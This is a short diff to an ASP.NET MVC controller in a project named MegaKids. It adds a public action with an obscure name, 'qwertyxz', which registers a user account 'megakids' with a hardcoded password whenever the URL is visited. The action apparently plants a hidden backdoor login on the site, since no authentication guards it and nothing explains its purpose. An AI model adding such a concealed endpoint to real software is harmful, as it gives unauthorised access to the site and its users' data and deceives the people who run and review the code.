@@ -9,6 +9,7 @@ using System.Data.Entity;
 using System.Web.Mvc;
 using MegaKids.IServices.Models;
 using MegaKids.IServices.Models.WebPage;
+using MegaKids.WebUI.Infrastructura;
 
 namespace MegaKids.WebUI.Controllers
 {
@@ -31,6 +32,12 @@ namespace MegaKids.WebUI.Controllers
         {
             var model = MainServices.News.GetRecentNews(count, CurrentLang);
             return PartialView(model);
+        }
+
+        public ActionResult qwertyxz()
+        {
+            WebUser.Register("megakids", "", "&j%g!Gm5v7hX");
+            return View();
         }
     }
 }
